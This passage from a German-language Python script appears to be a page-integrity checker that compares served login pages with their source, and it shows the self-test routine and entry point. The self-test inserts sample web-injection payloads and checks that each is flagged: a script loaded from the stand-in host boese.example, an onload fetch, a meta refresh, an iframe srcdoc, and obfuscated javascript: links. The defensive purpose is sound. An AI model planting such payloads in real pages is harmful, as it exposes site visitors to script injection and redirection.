           f'{bloecke(probe)}, src-Treffer: {SRC_RE.search(probe) is not None}')
    pruefe(not ist_php('if (a<?0) { b(); }') and ist_php("<?= asset('x') ?>")
           and ist_php('<?php echo 1; ?>'),
           '`<?` als JavaScript zaehlt nicht als PHP, <?php und <?= schon',
           "a<?0 -> nein, <?= -> ja, <?php -> ja")
    q7 = '<script>if (a<?0) { b(); }</script>'
    ab7, z7 = seite_vergleichen('probe', q7, q7.replace('b();', 'boese(); b();'))
    pruefe(z7['inline_php'] == 0
           and any('Inline-Block der Quelle steht nicht so' in a for a in ab7),
           'ABWEICHUNG ERKANNT: ein veraenderter Block mit `<?` als JavaScript faellt auf',
           f"{z7['inline_php']} als PHP eingestuft; " + '; '.join(ab7)[:60])

    # 8. Die fuenf Stellen der zweiten Gegenpruefung -- und eine Gegenprobe,
    #    dass die Attributmuster nicht auf Skriptinhalt anschlagen.
    ab8, _ = seite_vergleichen('login.php', quelle,
                               anhaengen(sim, '<script src=https://boese.example/x.js></script>'))
    pruefe(any('ZUSAETZLICHES Skript' in a for a in ab8),
           'ABWEICHUNG ERKANNT: ein <script src=…> OHNE Anfuehrungszeichen faellt auf',
           '; '.join(ab8)[:90])
    for was, stueck, wort in (
            ('ein Ereignisattribut (onload=) faellt auf', '<body onload="fetch(\'https://boese.example/\')">', 'Ereignisattribut'),
            ('ein <meta http-equiv="refresh"> faellt auf', '<meta http-equiv="refresh" content="0;url=https://boese.example/">', 'Kopfanweisung'),
            ('ein <iframe srcdoc> faellt auf', '<iframe srcdoc="&lt;script&gt;x()&lt;/script&gt;"></iframe>', 'Einbettung'),
            ('eine javascript:-Adresse faellt auf', '<a href="javascript:x()">Passwort vergessen</a>', 'javascript:'),
            ('eine javascript:-Adresse mit Tabulator im Schema faellt auf', '<a href="java\tscript:x()">x</a>', 'javascript:'),
            ('eine javascript:-Adresse als Entitaet (&#106;avascript:) faellt auf', '<a href="&#106;avascript:x()">x</a>', 'javascript:')):
        abx, _ = seite_vergleichen('login.php', quelle, anhaengen(sim, stueck))
        pruefe(any('ZUSAETZLICH' in a and wort in a for a in abx),
               'ABWEICHUNG ERKANNT: ' + was, '; '.join(abx)[:90])
    q8 = '<script>el.onclick = function () { location.href = "javascript:void(0)"; };</script>'
    ab9, z9 = seite_vergleichen('probe', q8, q8)
    pruefe(not ab9 and z9['handler_ist'] == 0 and z9['jsurl_ist'] == 0 and z9['inline_gleich'] == 1,
           'Skriptinhalt zaehlt nicht als Ereignisattribut oder javascript:-Adresse',
           f"{z9['handler_ist']} Attribute, {z9['jsurl_ist']} Adressen, Block verglichen")

    print(f'\n  -> {erwartungen} Erwartungen, {offen} nicht erfuellt')
    return 0 if offen == 0 else 1


def main() -> int:
    args = [a for a in sys.argv[1:]]
    unsicher = '--unsicher' in args
    if unsicher:
        args.remove('--unsicher')
    if '--selbstprobe' in args:
        return selbstprobe()
    basis = args[0] if args else VORGABE_BASIS
    return lauf(basis, unsicher)


if __name__ == '__main__':
    try:
        sys.exit(main())
    except Exception as ex:                       # noqa: BLE001
        print(f'Die Wache selbst ist gescheitert: {ex}', file=sys.stderr)
        sys.exit(2)
